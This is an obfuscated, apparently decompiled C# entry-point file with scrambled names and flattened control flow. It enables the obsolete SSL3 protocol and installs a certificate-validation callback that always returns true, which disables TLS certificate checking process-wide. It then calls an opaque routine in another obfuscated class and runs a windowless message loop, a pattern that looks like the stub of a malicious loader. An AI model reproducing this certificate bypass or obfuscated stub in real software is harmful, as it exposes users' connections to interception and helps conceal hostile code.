using System;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using ppkr;

namespace _9lNdmACl;

public class fTuUeb142wW
{
	[STAThread]
	public static void oDNYVgQSr51()
	{
		int num = 0;
		do
		{
			if (num == 4)
			{
				Application.Run();
				num = 5;
			}
			if (num == 2)
			{
				ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object ucPVg, X509Certificate G8Tj, X509Chain ZRih, SslPolicyErrors CPdlsHcwVG) =>
				{
					int num2 = 0;
					do
					{
						if (num2 == 0)
						{
							num2 = 1;
						}
					}
					while (num2 != 1);
					return true;
				}));
				num = 3;
			}
			if (num == 1)
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
				num = 2;
			}
			if (num == 3)
			{
				_3UzST.ilJpcEM8bsS();
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
	}

	[CompilerGenerated]
	private static bool _1kiG5(object ucPVg, X509Certificate G8Tj, X509Chain ZRih, SslPolicyErrors CPdlsHcwVG)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		return true;
	}
}
